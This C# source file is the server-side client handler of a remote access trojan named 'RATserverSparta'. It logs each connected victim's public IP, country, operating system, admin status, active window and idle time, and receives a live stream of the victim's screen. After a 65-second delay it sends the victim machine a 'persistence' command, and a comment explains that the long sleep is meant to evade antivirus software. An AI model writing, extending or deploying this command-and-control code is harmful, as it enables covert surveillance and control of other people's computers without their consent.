using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RATserverSparta.Client
{
    public class Client
    {
        public delegate void LogAddValue(string type, string value, string date);
        public delegate void ListViewItemAdd(string type, System.Net.Sockets.Socket sck, byte[] message, int index);
        public delegate void GotChatMessage(byte[] buffer);
        public delegate void screenStream(byte[] buffer);

        public event LogAddValue CreateLogValue;
        public event ListViewItemAdd ListViewAction;
        public event GotChatMessage chatMessageEvent;
        public event screenStream screenStreamEvent;

        public string ScreenResolution;
        private MainGUI MainGUI_Instance;
        private System.Net.Sockets.Socket ClientSocket;
        private bool ClientConnected;
        private SocketSend Data;
        public Client(MainGUI MainGUI_Instance, System.Net.Sockets.Socket Server) 
        {
            this.MainGUI_Instance = MainGUI_Instance;
            this.ClientSocket = Server;
            this.CreateLogValue = delegate { };
            this.ListViewAction = delegate { };
            this.chatMessageEvent = delegate { };
            this.screenStreamEvent = delegate { };
    }

        public void Receive()
        {
            //Creating instance to the Client Message Read class
            SocketRead ClientMessage = new SocketRead();

            while (ClientConnected)
            {
                try
                {
                    //Expecting to get 6 bytes
                    byte[] tlv = ClientMessage.Read(ClientSocket, 6);
                    //The first byte will be the type
                    byte type = tlv[0];
                    //all the other bytes are the length
                    int lengthRead = BitConverter.ToInt32(tlv, 1);
                    //And then, using the length we got, we will read data again
                    byte[] data = ClientMessage.Read(ClientSocket, lengthRead);

                    switch (type)
                    {
                        case 0: this.Data.Send(null, 0); this.ClientConnected = false; break; //Logout
                        case 1: chatMessageEvent(data); break; //chat message

                            //GUI Column Creating (Start)
                        case 19: ListViewAction.Invoke("Editing", ClientSocket, data, 7); break; //App opening date
                        case 17: ListViewAction.Invoke("Editing", ClientSocket, data, 6); break; //Running as admin or user?
                        case 16: ListViewAction.Invoke("Editing", ClientSocket, data, 5); break; //Operating system
                        case 2: ListViewAction.Invoke("Editing", ClientSocket, data, 4); break; //idle Time
                        case 3: ListViewAction.Invoke("Editing", ClientSocket, data, 3); break; //Current window
                        case 5: ListViewAction.Invoke("Editing", ClientSocket, data, 2); break; //public IP
                        case 6: ListViewAction.Invoke("Editing", ClientSocket, data, 1); break; //Country
                            //GUI Column Creating (End)

                        case 8: screenStreamEvent(data); break; //screen share
                        case 21: this.ScreenResolution = Encoding.ASCII.GetString(data); break; //client screen resolution
                    }
                }
                catch { }
            }
            //When the while loop ends, Then it says that there is no connection.
            LogAdd("[-] Client Disconnected", ClientSocket.RemoteEndPoint.ToString());
            ListViewAction.Invoke("Removing", ClientSocket, null, 0);
        }

        private void LogAdd(string type, string value)
        {
            //Cross-Threading, There is need to invoke the current action to the WinForm Class instance
            this.MainGUI_Instance.Invoke((MethodInvoker)delegate
            {
                this.CreateLogValue.Invoke(type, value, DateTime.Now.ToString());
            });
        }

        public void Setup()
        {
            this.ClientConnected = true;
            LogAdd("[+] Client connected", this.ClientSocket.RemoteEndPoint.ToString());
            ListViewAction.Invoke("Adding", ClientSocket, null, 0);

            //Creating instance to the Client Message Send class
            SocketSend ClientData = new SocketSend(ClientSocket);
            this.Data = ClientData;

            //Type 20 stands for persistence. This thing will happen at the client side.
            //Long sleeps Helping evade the anti virus, And thats because anti virus dont want to use too many resources, when programs are using long sleeps, it may help evade the AV (Anti Virus) softwares.
            new Thread(new ThreadStart(() =>
            {
                Thread.Sleep(65000);
                ClientData.Send(Encoding.ASCII.GetBytes("\0"), 20);
            })).Start();

            //Connection Test every 10 seconds
            new Thread(new ThreadStart(() =>
            {
                while (ClientConnected)
                {
                    if (!ClientData.Send(Encoding.ASCII.GetBytes("\0"), 100))
                    {
                        this.ClientConnected = false;
                        break; //Leaving thread, its resources reclaimed because C# have a Garbage Collector
                    }
                    Thread.Sleep(10000);
                }
            })).Start();
        }
    }
}
